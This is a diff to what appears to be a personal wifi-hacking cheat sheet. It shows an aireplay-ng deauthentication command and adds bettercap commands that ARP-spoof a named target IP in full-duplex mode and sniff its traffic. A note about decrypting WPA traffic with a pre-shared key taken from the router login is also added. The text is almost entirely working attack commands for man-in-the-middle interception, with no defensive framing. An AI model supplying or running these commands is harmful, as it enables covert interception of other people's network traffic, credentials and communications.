@@ -76,12 +76,24 @@ aireplay-ng --deauth 0 -c [DEVICES MAC ADDRESS] -a [ROUTERS MAC ADDRESS] wlan0mo
 
 
 -----------------------------------------------------[WHOS CONNECTINIG TO ME]---------------------------------------------
-netscanner
-angry ip scanner
-netdiscover 
+[netscanner]
+[angry ip scanner]
+[netdiscover]
 
+[bettercap]
+bettercap  -iface wlan0
+sudo bettercap -caplet http-ui [UI MODE]
+[commansd]
+net.show [shows whos connected to device]
+net.probe on [probes packetsfor recon]
+set arp.spoof.fullduplex true [sets attack to victim and  host]
+set arp.spoof.targets 192.168.43.157(IP address of the target Device)
+arp.spoof on
+set net.sniff.local true
+net.sniff on
 -----------------------------------------------------[WIRESHARK - PSK SPY ]------------------------------------------
-First enter psk info into : https://www.wireshark.org/tools/wpa-psk.html
+First enter psk info into : https://www.wireshark.org/tools/wpa-psk.html (Gained from router pass and login) 
+
 
 ----------------------------------------------------[tracking domain]---------------------------------------------
 
